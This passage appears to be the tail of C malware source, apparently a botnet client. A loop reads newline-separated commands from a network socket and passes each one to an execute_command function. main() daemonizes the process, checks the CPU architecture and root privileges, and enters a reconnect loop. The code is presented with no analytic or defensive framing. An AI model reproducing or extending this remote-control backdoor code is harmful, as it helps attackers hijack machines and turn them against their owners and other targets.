        }
        
        if (FD_ISSET(sock, &readfds)) {
            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) {
                close(sock);
                sock = -1;
                continue;
            }
            buffer[bytes] = '\0';
            
            char* line = strtok(buffer, "\n");
            while (line) {
                execute_command(line);
                line = strtok(NULL, "\n");
            }
        }
    }
}

int main() {
    daemonize();
    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL) ^ getpid());
    get_arch();
    check_root();
    reconnect_loop();
    return 0;
}
